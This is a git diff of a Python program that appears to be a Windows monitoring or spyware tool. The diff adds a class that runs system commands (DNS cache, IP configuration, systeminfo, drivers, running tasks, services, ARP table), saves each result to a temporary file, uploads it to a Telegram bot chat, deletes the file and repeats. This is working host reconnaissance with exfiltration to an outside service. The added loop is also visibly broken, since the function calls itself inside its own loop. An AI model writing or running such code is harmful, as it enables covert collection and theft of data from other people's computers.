@@ -434,7 +434,7 @@ class Screenshot:
             self.__interval = WinRegistry(self.__regeditPath_screenshot).read_value('interval_seconds')
             self.__active = int(str(WinRegistry(self.__regeditPath_screenshot).read_value('active')))
             time.sleep(self.__interval)
-         
+
 
 class WebsiteBlock:
     def __init__(self):
@@ -540,6 +540,92 @@ class WebsiteBlock:
 
     def reset(self):
         self.unlock()
+
+
+class PCInformation:
+    def __init__(self):
+        pass
+
+    @staticmethod
+    def __CMD_command(title, command):
+        response = title + "\n" + Util().current_time()+"\n"
+        lines = os.popen(command)
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+        return response
+
+    def __display_dns(self):
+        return self.__CMD_command(
+            title="DNS Display Information",
+            command="ipconfig /displaydns")
+
+    def __ip_config(self):
+        return self.__CMD_command(
+            title="Information: IP Config /all",
+            command="ipconfig /all")
+
+    def __system_info(self):
+        return self.__CMD_command(
+            title="Information: System",
+            command="systeminfo")
+
+    def __driver_info(self):
+        return self.__CMD_command(
+            title="Information: Driver Information",
+            command="DRIVERQUERY")
+
+    def __taks_list(self):
+        return self.__CMD_command(
+            title="Information: Taks List",
+            command="TASKLIST")
+
+    def __service_active(self):
+        return self.__CMD_command(
+            title="Information: Services active",
+            command="net start")
+
+    def __red_info(self):
+        def internalIP():
+            internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            internal_ip.connect(('google.com', 0))
+            return internal_ip.getsockname()[0]
+
+        response = "Information: RED Info\n"
+        lines = os.popen('arp -a -N ' + internalIP())
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+        return response
+
+    def send(self):
+        def init():
+            bot = telepot.Bot(Config.TelegramBot().TOKEN)
+            chat_id = Config.TelegramBot().ID[0]
+
+            data = {
+                "Información del DNS": self.__display_dns(),
+                "Información de la RED": self.__red_info(),
+                "Configuración del IP": self.__ip_config(),
+                "Información del sistema": self.__system_info(),
+                "Información de los controladores": self.__driver_info(),
+                "Programas ejecutandose": self.__taks_list(),
+                "Servicios ejecutandose": self.__service_active()
+            }
+            paths = []
+            for name, value in data.items():
+                path = Config().TEMP + '\\' + name + '.txt'
+                paths.append(path)
+                Util().save_file(path, value)
+
+                bot.sendChatAction(chat_id, 'typing')
+                bot.sendDocument(chat_id, open(path, 'rb'), Util().current_time())
+                time.sleep(5)
+                os.remove(path)
+
+                while (True):
+                    init()
+                    time.sleep(200)
 
 if __name__ == '__main__':
     folders = [
